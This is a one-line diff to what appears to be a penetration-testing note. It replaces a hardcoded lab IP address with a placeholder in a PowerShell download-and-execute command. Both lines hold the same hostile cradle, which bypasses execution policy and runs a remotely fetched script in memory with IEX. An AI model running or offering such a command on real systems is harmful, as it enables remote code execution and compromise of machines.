@@ -1,1 +1,1 @@
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile IEX((New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1'))
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile IEX((New-Object System.Net.WebClient).DownloadString('http://<LocalIPAddress>/helloworld.ps1'))
